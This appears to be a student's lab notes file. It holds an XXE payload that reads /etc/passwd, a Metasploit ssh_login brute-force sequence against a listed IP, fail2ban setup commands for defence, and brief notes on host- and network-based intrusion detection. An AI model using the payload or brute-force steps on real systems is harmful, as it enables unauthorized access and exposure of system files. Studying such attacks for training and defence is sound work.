@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+
+208.8.8.138
+192.168.101.171
+
+ir pw: 208.8.8.133
+
+
+msf: (emulator)
+search ssh_login
+use 0
+show options
+set rhosts 208.8.8.133
+set user_file /home/admin/Desktop/user
+set pass_file /home/admin/Desktop/pass
+set stop_on_success true
+set verbose true
+show options
+exploit
+----------------------
+sudo dnf -y install fail2ban
+sudo systemctl enable --now fail2ban
+fail2ban-client status
+fail2ban-client status sshd
+sudo nano /etc/fail2ban/jail.local
+sudo systemctl restart fail2ban
+----------------------
+fail2ban-client status sshd
+sudo fail2ban-client set sshd unbanip "attacker ip address"
+
+
+HOST BASED INTRUSION DETECTION SYSTEM - Control Manage Alert system process
+installed on a server/end device
+ex. wazuh agent ossec
+NETWORK INTRUSION DECTECTION SySTEM - Mainly focus on network traffic etc.
+installed on network ex, suricata snort etc
